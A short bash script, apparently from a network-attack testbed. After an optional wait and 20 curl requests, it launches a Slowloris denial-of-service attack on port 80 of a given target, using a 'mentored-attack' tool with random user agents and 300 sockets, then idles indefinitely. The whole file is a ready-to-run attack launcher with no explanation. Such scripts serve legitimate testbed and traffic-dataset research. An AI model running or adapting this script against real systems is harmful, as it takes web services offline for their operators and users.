#!/bin/bash

# Check if $1 and $2 are defined, otherwise abort
if [ -z "$1" ] || [ -z "$2" ]
then
    echo "Usage: $0 <target> <iname> [wait_time]"
    exit 1
fi

target=$1
iname=$2

# if $3 is defined, then use it as the wait time
if [ -z "$3" ]
then
    wait_time=10
else
    wait_time=$3
fi

echo "Executing nmap ping-wait-scan.sh with target=$target, iname=$iname, wait_time=$wait_time"

sleep $wait_time

echo "Execute 20 curl requests to the target"
for i in {1..20}
do
    curl -s $target > /dev/null
done

echo "Running slowloris attack..."
mentored-attack slowloris $target $iname -p 80 --randuseragents -s 300

tail -f /dev/null